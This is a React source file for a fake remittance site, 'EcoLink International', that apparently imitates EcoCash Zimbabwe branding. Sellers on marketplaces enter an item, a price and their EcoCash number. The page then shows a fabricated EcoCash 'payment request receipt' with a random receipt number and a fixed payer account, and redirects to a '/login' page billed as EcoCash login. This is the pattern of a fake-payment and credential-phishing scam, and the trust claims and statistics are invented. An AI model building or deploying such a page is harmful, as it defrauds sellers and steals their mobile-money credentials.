import { useState } from "react";
import { useEcoLink } from "../Ecolinkcontext";
import "./Ecolink.css";

const PLATFORMS = [
  "Facebook Marketplace",
  "Instagram Shop",
  "WhatsApp Business",
  "Messenger Marketplace",
  "eBay",
  "Amazon Marketplace",
  "Etsy",
  "Jumia",
  "Jiji",
  "Craigslist",
  "Others",
];

const STATS = [
  { num: "15,000+", label: "EcoCash collection points" },
  { num: "50+",     label: "Countries supported" },
  { num: "<3 min",  label: "Average delivery time" },
  { num: "0% fees", label: "On first transfer" },
];

const COUNTRIES = ["United Kingdom","United States","South Africa","Canada","Australia","Kenya","UAE"];

function generateReceiptNumber() {
  const chars = "ABCDEFGHJKLMNPQRSTUVWXYZ23456789";
  const low   = "abcdefghjkmnpqrstuvwxyz23456789";
  const seg = (src, len) => Array.from({ length: len }, () => src[Math.floor(Math.random() * src.length)]).join("");
  return `ECO-${seg(chars,3)}-${seg(low,4)}-${Math.floor(1000 + Math.random() * 9000)}`;
}

export default function EcoLink() {
  /* ── all modal/overlay state lives HERE, outside hero ── */
  const [modal, setModal] = useState("none"); // "none" | "confirm" | "receipt" | "redirecting"
  const [formData, setFormData] = useState(null);
  const [receiptNumber, setReceiptNumber] = useState("");
  const [receiptDate,   setReceiptDate]   = useState("");

  const handleFormSubmit = (data) => {
    setFormData(data);
    setModal("confirm");
  };

  const handleConfirm = () => {
    try {
      localStorage.setItem("ecolink_sell", JSON.stringify(formData));
    } catch { /* ignore */ }
    const now = new Date();
    setReceiptDate(now.toLocaleString("en-GB", {
      day: "2-digit", month: "short", year: "numeric",
      hour: "2-digit", minute: "2-digit", second: "2-digit"
    }));
    setReceiptNumber(generateReceiptNumber());
    setModal("receipt");
  };

  const handleReceive = () => {
    setModal("redirecting");
    setTimeout(() => { window.location.href = "/login"; }, 3000);
  };

  return (
    <>
      {/* ── Hero ── */}
      <div className="hero">
        <div className="hero-bg-circle" style={{ width:300, height:300, top:-80,  right:-60 }} />
        <div className="hero-bg-circle" style={{ width:200, height:200, bottom:-40, left:-50 }} />

        <nav className="nav">
          <div className="nav-logo">
            <div className="logo-icon">
              <i className="ti ti-world" style={{ fontSize:20, color:"#085041" }} aria-hidden="true" />
            </div>
            <span className="logo-text">Eco<span>Link</span> International</span>
          </div>
          <ul className="nav-links">
            {["How it works","Send money","Rates","About"].map(l => (
              <li key={l}><a href="#">{l}</a></li>
            ))}
          </ul>
        </nav>

        <div className="hero-content">
          <div className="badge">
            <i className="ti ti-shield-check" style={{ fontSize:14 }} aria-hidden="true" />
            Trusted international remittance
          </div>
          <h1 className="hero-title">
            Receive money directly to <span>your EcoCash Zimbabwe</span> — instantly
          </h1>
          <p className="hero-sub">
            Affordable, fast, and secure transfers from anywhere in the world
            straight to your loved one's EcoCash wallet. No delays, no hidden fees.
          </p>
          <SellForm onSubmit={handleFormSubmit} />
        </div>
      </div>

      {/* ── Stats Bar ── */}
      <div className="stats-bar">
        {STATS.map(({ num, label }) => (
          <div className="stat-item" key={label}>
            <span className="stat-num">{num}</span>
            <span className="stat-label">{label}</span>
          </div>
        ))}
      </div>

      {/* ── CTA ── */}
      <div className="cta-section">
        <h2 className="cta-title">Send from anywhere in the world</h2>
        <p className="cta-sub">
          EcoLink International connects the global Zimbabwean diaspora to their families at home.
        </p>
        <div className="countries">
          {COUNTRIES.map(c => (
            <span className="country-pill" key={c}>
              <i className="ti ti-map-pin" style={{ fontSize:13 }} aria-hidden="true" />
              {c}
            </span>
          ))}
          <span className="country-pill">+ many more</span>
        </div>
      </div>

      {/* ── Footer ── */}
      <footer className="footer">
        <span className="footer-text">© 2026 EcoLink International. All rights reserved.</span>
        <div className="footer-links">
          {["Privacy","Terms","Support","Contact"].map(l => (
            <a href="#" key={l}>{l}</a>
          ))}
        </div>
      </footer>

      {/* ══════════════════════════════════════════
          OVERLAYS — rendered here, outside .hero,
          so overflow:hidden cannot clip them
      ══════════════════════════════════════════ */}

      {/* Confirm modal */}
      {modal === "confirm" && formData && (
        <div className="confirm-overlay" onClick={() => setModal("none")}>
          <div className="confirm-box" onClick={e => e.stopPropagation()}>
            <h3 className="confirm-title">Confirm Your Details</h3>

            <p className="confirm-note">
              <i className="ti ti-info-circle" aria-hidden="true" />
              You will be redirected to login to your account for verification and successful transfer of funds to your account.
            </p>

            <div className="confirm-summary">
              {[
                ["Platform",          formData.platform],
                ["Item Name",         formData.itemName],
                ["Price",             `${formData.currency} ${formData.amount}`],
                ["EcoCash Number",    formData.ecocashPhone],
                ["Payer's Account",   formData.payerAccountNumber],
                ["Payer's Name",      formData.payerName],
              ].map(([k, v]) => (
                <div className="confirm-row" key={k}>
                  <span className="confirm-key">{k}</span>
                  <span className="confirm-val">{v || "—"}</span>
                </div>
              ))}
            </div>

            <div className="confirm-actions">
              <button className="confirm-cancel" onClick={() => setModal("none")}>Edit</button>
              <button className="confirm-btn"    onClick={handleConfirm}>Confirm</button>
            </div>
          </div>
        </div>
      )}

      {/* Receipt */}
      {modal === "receipt" && formData && (
        <div className="confirm-overlay">
          <div className="receipt-box" onClick={e => e.stopPropagation()}>

            <div className="receipt-header-band">
              <div className="receipt-logo-mark">
                <span className="receipt-logo-eco">Eco</span><span className="receipt-logo-cash">Cash</span>
              </div>
              <p className="receipt-tagline">PAYMENT REQUEST RECEIPT</p>
            </div>

            <div className="receipt-meta">
              <div className="receipt-meta-row">
                <span className="receipt-meta-key">Receipt No.</span>
                <span className="receipt-meta-val receipt-mono">{receiptNumber}</span>
              </div>
              <div className="receipt-meta-row">
                <span className="receipt-meta-key">Date &amp; Time</span>
                <span className="receipt-meta-val receipt-mono">{receiptDate}</span>
              </div>
              <div className="receipt-meta-row">
                <span className="receipt-meta-key">Status</span>
                <span className="receipt-status-pill">● PENDING</span>
              </div>
            </div>

            <div className="receipt-tear">
              <div className="receipt-tear-circle left" />
              <div className="receipt-tear-dashes" />
              <div className="receipt-tear-circle right" />
            </div>

            <div className="receipt-amount-hero">
              <p className="receipt-amount-label">AMOUNT TO RECEIVE</p>
              <p className="receipt-amount-value">
                {formData.currency} {parseFloat(formData.amount || 0).toLocaleString("en-US", { minimumFractionDigits: 2, maximumFractionDigits: 2 })}
              </p>
            </div>

            <div className="receipt-section-title">ITEM DETAILS</div>
            <div className="receipt-details">
              <div className="receipt-detail-row">
                <span className="receipt-detail-key">Platform</span>
                <span className="receipt-detail-val">{formData.platform}</span>
              </div>
              <div className="receipt-detail-row">
                <span className="receipt-detail-key">Item</span>
                <span className="receipt-detail-val">{formData.itemName}</span>
              </div>
            </div>

            <div className="receipt-section-title">SELLER (YOU)</div>
            <div className="receipt-details">
              <div className="receipt-detail-row">
                <span className="receipt-detail-key">EcoCash No.</span>
                <span className="receipt-detail-val receipt-mono">{formData.ecocashPhone}</span>
              </div>
            </div>

            <div className="receipt-section-title">PAYER</div>
            <div className="receipt-details">
              <div className="receipt-detail-row">
                <span className="receipt-detail-key">Name</span>
                <span className="receipt-detail-val">{formData.payerName}</span>
              </div>
              <div className="receipt-detail-row">
                <span className="receipt-detail-key">Account No.</span>
                <span className="receipt-detail-val receipt-mono">{formData.payerAccountNumber}</span>
              </div>
            </div>

            <div className="receipt-tear" style={{ margin:"16px 0 12px" }}>
              <div className="receipt-tear-circle left" />
              <div className="receipt-tear-dashes" />
              <div className="receipt-tear-circle right" />
            </div>

            <p className="receipt-footer-note">
              Login to your EcoCash account to verify and complete the transfer of funds.
            </p>

            <button className="receipt-receive-btn" onClick={handleReceive}>ACCEPT</button>

            <p className="receipt-powered">Powered by EcoLink International</p>
          </div>
        </div>
      )}

      {/* Redirecting */}
      {modal === "redirecting" && (
        <div className="redirect-overlay">
          <div className="redirect-box">
            <div className="redirect-spinner" />
            <p className="redirect-text">Redirecting to EcoCash Login…</p>
          </div>
        </div>
      )}
    </>
  );
}

/* ─────────────────────────────────────────────────────
   SellForm — pure presentational, calls onSubmit(data)
───────────────────────────────────────────────────── */
function SellForm({ onSubmit }) {
  const accountNumber = import.meta.env.VITE_ACCOUNT_NUMBER || "Not set";
  const accountName   = import.meta.env.VITE_ACCOUNT_NAME   || "Not set";

  const [platform,      setPlatform]      = useState("");
  const [otherPlatform, setOtherPlatform] = useState("");
  const [itemName,      setItemName]      = useState("");
  const [currency,      setCurrency]      = useState("");
  const [amount,        setAmount]        = useState("");
  const [ecocashPhone,  setEcocashPhone]  = useState("");
  const [phoneError,    setPhoneError]    = useState("");

  const resolvedPlatform = platform === "Others" ? otherPlatform : platform;

  const handlePhoneChange = (e) => {
    const digits = e.target.value.replace(/\D/g, "").slice(0, 10);
    setEcocashPhone(digits);
    const len = digits.length;
    if (len === 0) { setPhoneError(""); return; }
    if (len < 9)  { setPhoneError("Number too short — must be 9 or 10 digits"); return; }
    if (len === 10) {
      if (digits[0] !== "0" || digits[1] !== "7") { setPhoneError("10-digit numbers must start with 07"); return; }
    }
    if (len === 9 && digits[0] !== "7") { setPhoneError("9-digit numbers must start with 7"); return; }
    setPhoneError("");
  };

  const formatPhone = (raw) => {
    const clean = raw.startsWith("0") ? raw.slice(1) : raw;
    return `+263${clean}`;
  };

  const handleSubmit = (e) => {
    e.preventDefault();
    if (phoneError || ecocashPhone.length < 9) {
      setPhoneError("Please enter a valid EcoCash number");
      return;
    }
    onSubmit({
      platform: resolvedPlatform,
      itemName,
      currency,
      amount,
      ecocashPhone:        formatPhone(ecocashPhone),
      payerAccountNumber:  accountNumber,
      payerName:           accountName,
    });
  };

  return (
    <form className="sell-form" onSubmit={handleSubmit}>
      <h3 className="sell-form-header">ENTER THE DETAILS OF THE ITEM YOU&apos;RE SELLING</h3>

      <div className="form-group">
        <label className="form-label">PLATFORM</label>
        <select className="form-control" value={platform} onChange={e => setPlatform(e.target.value)} required>
          <option value="" disabled>Select a platform</option>
          {PLATFORMS.map(p => <option key={p} value={p}>{p}</option>)}
        </select>
      </div>

      {platform === "Others" && (
        <div className="form-group">
          <label className="form-label">SPECIFY PLATFORM</label>
          <input className="form-control" type="text" placeholder="Enter platform name"
            value={otherPlatform} onChange={e => setOtherPlatform(e.target.value)} required />
        </div>
      )}

      <div className="form-group">
        <label className="form-label">ITEM NAME</label>
        <input className="form-control" type="text" placeholder="e.g. iPhone 14 Pro"
          value={itemName} onChange={e => setItemName(e.target.value)} required />
      </div>

      <div className="form-row">
        <div className="form-group">
          <label className="form-label">PRICE CURRENCY</label>
          <select className="form-control" value={currency} onChange={e => setCurrency(e.target.value)} required>
            <option value="" disabled>Select currency</option>
            <option value="USD">USD</option>
            <option value="ZWL">ZWL</option>
          </select>
        </div>
        <div className="form-group">
          <label className="form-label">AMOUNT</label>
          <input className="form-control" type="number" placeholder="0.00" min="0" step="0.01"
            value={amount} onChange={e => setAmount(e.target.value)} required />
        </div>
      </div>

      <div className="form-group">
        <label className="form-label">ECOCASH PHONE NUMBER</label>
        <div className={`phone-input-wrap ${phoneError ? "has-error" : ""}`}>
          <span className="phone-prefix">
            <span className="phone-flag">🇿🇼</span>
            <span className="phone-code">+263</span>
          </span>
          <input className="form-control phone-field" type="tel" placeholder="712345678"
            value={ecocashPhone} onChange={handlePhoneChange} maxLength="10" required />
        </div>
        {phoneError && <span className="phone-error">{phoneError}</span>}
      </div>

      <div className="form-row">
        <div className="form-group">
          <label className="form-label">PAYER&apos;S ACCOUNT NUMBER</label>
          <input className="form-control autofill" type="text" value={accountNumber} readOnly />
        </div>
        <div className="form-group">
          <label className="form-label">PAYER&apos;S NAME</label>
          <input className="form-control autofill" type="text" value={accountName} readOnly />
        </div>
      </div>

      <button className="form-submit" type="submit">Submit</button>
    </form>
  );
}